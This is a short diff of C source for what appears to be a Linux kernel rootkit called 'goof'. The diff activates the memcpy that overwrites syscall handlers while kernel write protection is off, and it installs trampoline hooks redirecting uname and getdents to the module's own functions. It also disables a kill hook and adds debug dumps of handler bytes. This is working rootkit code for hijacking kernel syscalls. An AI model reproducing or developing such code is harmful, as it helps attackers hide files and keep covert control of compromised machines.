@@ -305,7 +305,7 @@ unsigned char *create_tramp(unsigned long *src, unsigned long *new_func, unsigne
 	//Write hook to syscall table
 	printk("[goof] Memory hasn't been written\n");
 	DISABLE_W_PROTECTED_MEMORY
-	//memcpy(src, jump, h->hook_len);
+	memcpy(src, jump, h->hook_len);
 	ENABLE_W_PROTECTED_MEMORY
 
 	return NULL;
@@ -342,11 +342,11 @@ goof_init(void) {
 	//Trampolining way to overwrite syscall
 	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, 16);
 	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, 15);
-	create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, 16);
+	//create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, 16);
 	//Creating a new trampoline - DEBUG
 	
 	printk("[goof] DEBUG\n ");
-	unsigned char *ptr_tmp = (unsigned char *)sys_call_table[__NR_kill];
+	unsigned char *ptr_tmp = (unsigned char *)__sys_call_table[__NR_kill];
 	for(int i = 0; i < 32; i++){
 		printk("%02x ", ptr_tmp[i]);
 	}
